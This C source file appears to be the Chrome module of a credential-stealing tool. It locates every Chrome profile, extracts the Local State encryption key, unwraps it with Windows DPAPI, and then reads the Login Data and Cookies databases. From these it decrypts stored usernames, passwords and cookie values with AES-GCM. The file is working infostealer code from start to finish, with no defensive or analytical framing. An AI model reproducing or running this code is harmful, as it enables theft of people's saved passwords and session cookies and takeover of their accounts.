#include "LF_Crypter.c"
#include "LF_SQLite.c"
#include "LF_Utils.c"

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define LF_CHROME_MAX_PROFILES 10

// _A_ = append to ... path
#define LF_CHROME__USERDATA_PATH "\\Google\\Chrome\\User Data"
#define LF_CHROME__LOCALSTATE_A_PATH "\\Local State"
#define LF_CHROME__LOGIN_DATA_A_PATH "\\Login Data"
#define LF_CHROME__COOKIES_A_PATH "\\Network\\Cookies"

struct LF_Chrome_login_data_struct
{
  char *action_url;
  char *username_value;
  char *password_value;
};
struct LF_Chrome_cookie_data_struct
{
  char *host_key;
  char *name;
  char *value;
};
struct LF_Chrome_data_struct
{
  struct LF_Utils_arraylist_struct *profile_path_list;
  struct LF_Utils_arraylist_struct *login_data_list;
  struct LF_Utils_arraylist_struct *cookie_data_list;

  // TODO: add profile struct,
  //       which contains the logins & cookies
  //       to better separate the data
};

void
LF_Chrome__get_userdata_path (char *out)
{
  char *appdata_path = getenv ("LOCALAPPDATA");

  strcpy (out, appdata_path);
  strcat (out, LF_CHROME__USERDATA_PATH);
}
void
LF_Chrome__get_localstate_path (char *userdata_path, char *out)
{
  strcpy (out, userdata_path);
  strcat (out, LF_CHROME__LOCALSTATE_A_PATH);
}
void
LF_Chrome__get_login_data_path (char *profile_path, char *out)
{
  strcpy (out, profile_path);
  strcat (out, LF_CHROME__LOGIN_DATA_A_PATH);
}
void
LF_Chrome__get_cookies_path (char *profile_path, char *out)
{
  strcpy (out, profile_path);
  strcat (out, LF_CHROME__COOKIES_A_PATH);
}

char *
LF_Chrome__get_encryption_key (char *localstate_path, int *len)
{
  int buf_len = 4096;
  char buf[buf_len];
  LF_Utils_read_file (localstate_path, buf, buf_len);

  const char *key_start = "\"encrypted_key\":\"";
  const char *key_end = "\"";

  char *encryption_key
      = LF_Utils_find_str_in_range (buf, key_start, key_end, len);
  if (encryption_key == NULL)
    {
      fprintf (stderr, "unable to find encryption key\n");
      exit (-1);
    }

  return encryption_key;
}
void
LF_Chrome__profile_search_callback (char *dir_path, WIN32_FIND_DATA ffd,
                                    void *data)
{
  if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
    {
      return;
    }

  if (strncmp (ffd.cFileName, "Profile", 7) != 0
      && strncmp (ffd.cFileName, "Default", 7) != 0)
    {
      return;
    }

  char folder_path[MAX_PATH];
  strcpy (folder_path, dir_path);
  strcat (folder_path, "\\");
  strcat (folder_path, ffd.cFileName);

  LF_Utils_arraylist_add ((struct LF_Utils_arraylist_struct *)data,
                          strdup (folder_path));
}
void
LF_Chrome__login_data_db_search_callback (
    char *decrypted_key, void *data, struct LF_SQLite_entry_struct *entries)
{
  struct LF_Chrome_login_data_struct *login_data
      = malloc (sizeof (struct LF_Chrome_login_data_struct));
  // are those strdup's free'd?
  login_data->action_url = strdup (entries[0].value);
  login_data->username_value = strdup (entries[1].value);

  char *password_value = entries[2].value;
  int password_value_len = entries[2].value_len;

  char *iv = NULL;
  char *tag = NULL;
  int tag_len = 0;
  LF_Crypter_separate_iv_tag (password_value, password_value_len, &iv, &tag,
                              &tag_len);

  login_data->password_value
      = LF_Crypter_decrypt_aes_256_gcm (decrypted_key, iv, tag, tag_len);

  free (iv);
  free (tag);

  LF_Utils_arraylist_add ((struct LF_Utils_arraylist_struct *)data,
                          login_data);
}
void
LF_Chrome__cookies_db_search_callback (char *decrypted_key, void *data,
                                       struct LF_SQLite_entry_struct *entries)
{
  struct LF_Chrome_cookie_data_struct *cookie_data
      = malloc (sizeof (struct LF_Chrome_cookie_data_struct));

  cookie_data->host_key = strdup (entries[0].value);
  cookie_data->name = strdup (entries[1].value);

  char *encrypted_value = entries[2].value;
  int encrypted_value_len = entries[2].value_len;

  char *iv = NULL;
  char *tag = NULL;
  int tag_len = 0;
  LF_Crypter_separate_iv_tag (encrypted_value, encrypted_value_len, &iv, &tag,
                              &tag_len);

  cookie_data->value
      = LF_Crypter_decrypt_aes_256_gcm (decrypted_key, iv, tag, tag_len);

  free (iv);
  free (tag);

  LF_Utils_arraylist_add ((struct LF_Utils_arraylist_struct *)data,
                          cookie_data);
}
void
LF_Chrome__populate_profile_arraylist (char *userdata_path,
                                       struct LF_Utils_arraylist_struct *out)
{
  LF_Utils__loop_through_dir (
      userdata_path, LF_Chrome__profile_search_callback, (void **)&out);
}

void
LF_Chrome_populate_data (struct LF_Chrome_data_struct *out)
{
  char userdata_path[MAX_PATH];
  LF_Chrome__get_userdata_path (userdata_path);

  char localstate_path[MAX_PATH];
  LF_Chrome__get_localstate_path (userdata_path, localstate_path);

  int encryption_key_len;
  char *encryption_key
      = LF_Chrome__get_encryption_key (localstate_path, &encryption_key_len);

  int decrypted_key_len;
  char *decrypted_key = LF_Crypter_decrypt_dpapi (
      encryption_key, encryption_key_len, &decrypted_key_len);

  out->profile_path_list = LF_Utils_arraylist_new_default ();
  out->login_data_list = LF_Utils_arraylist_new_default ();
  out->cookie_data_list = LF_Utils_arraylist_new_default ();

  LF_Chrome__populate_profile_arraylist (userdata_path,
                                         out->profile_path_list);

  for (int i = 0; i < out->profile_path_list->length; i++)
    {
      char *profile_path = LF_Utils_arraylist_get (out->profile_path_list, i);
      if (profile_path == NULL)
        {
          continue;
        }

      char login_data_path[MAX_PATH];
      LF_Chrome__get_login_data_path (profile_path, login_data_path);

      char cookies_path[MAX_PATH];
      LF_Chrome__get_cookies_path (profile_path, cookies_path);

      {
        const char *sql
            = "SELECT action_url, username_value, password_value FROM logins";
        LF_SQLite_exec (login_data_path, sql,
                        LF_Chrome__login_data_db_search_callback,
                        decrypted_key, out->login_data_list);
      }
      {
        const char *sql
            = "SELECT host_key, name, encrypted_value FROM cookies";
        LF_SQLite_exec (cookies_path, sql,
                        LF_Chrome__cookies_db_search_callback, decrypted_key,
                        out->cookie_data_list);
      }
    }
  free (encryption_key);
  free (decrypted_key);
}
void
LF_Chrome_free_data (struct LF_Chrome_data_struct *out)
{
  LF_Utils_arraylist_free (out->profile_path_list);
  LF_Utils_arraylist_free (out->login_data_list);
  LF_Utils_arraylist_free (out->cookie_data_list);
}
